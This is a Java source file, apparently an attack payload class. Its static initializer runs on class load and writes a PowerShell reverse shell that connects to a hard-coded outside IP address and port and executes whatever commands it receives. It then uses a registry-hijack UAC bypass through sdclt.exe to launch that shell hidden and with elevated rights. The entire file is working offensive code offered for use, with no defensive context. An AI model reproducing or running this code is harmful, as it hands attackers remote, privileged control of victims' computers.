import java.io.FileWriter;
import java.io.IOException;

public class Exploit {
    static {
        try {
            String host = "104.199.254.153";
            int port = 8000;

            // PowerShell payload as a string
            String payload = String.format(
                "$client = New-Object System.Net.Sockets.TCPClient('%s', %d);" +
                "$stream = $client.GetStream();" +
                "$writer = New-Object System.IO.StreamWriter($stream);" +
                "$reader = New-Object System.IO.StreamReader($stream);" +
                "$writer.AutoFlush = $true;" +
                "while ($true) {" +
                    "$command = $reader.ReadLine();" +
                    "if ($command -eq 'exit') { break }" +
                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message };" +
                    "$writer.WriteLine($output);" +
                "}" +
                "$client.Close();", host, port);

            // Write the payload to a .ps1 file
            String ps1FilePath = System.getProperty("user.home") + "\\reverse_shell.ps1";
            try (FileWriter fileWriter = new FileWriter(ps1FilePath)) {
                fileWriter.write(payload);
            }

            // Define the UAC bypass function
            String uacBypassCommand = String.format(
                "function uacbypass { " +
                    "param($ps1Path) " +
                    "New-Item -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Value ('powershell -ExecutionPolicy Bypass -WindowStyle hidden -File \"' + $ps1Path + '\"'); " +
                    "New-ItemProperty -Force -Path 'HKCU:\\Software\\Classes\\Folder\\shell\\open\\command' -Name 'DelegateExecute'; " +
                    "Start-Process -FilePath $env:windir\\system32\\sdclt.exe; " +
                    "Start-Sleep -s 2; " +
                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\Folder' -Recurse;" +
                "}; " +
                // Call uacbypass to execute the .ps1 script
                "uacbypass '%s';", ps1FilePath
            );

            // Run the UAC bypass PowerShell command
            String[] command = {
                "cmd.exe", "/c", "start", "/min", "powershell.exe",
                "-NoProfile",
                "-WindowStyle", "hidden",
                "-ExecutionPolicy", "Bypass",
                "-Command", uacBypassCommand
            };

            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            System.out.println("PowerShell reverse shell and UAC bypass executed.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}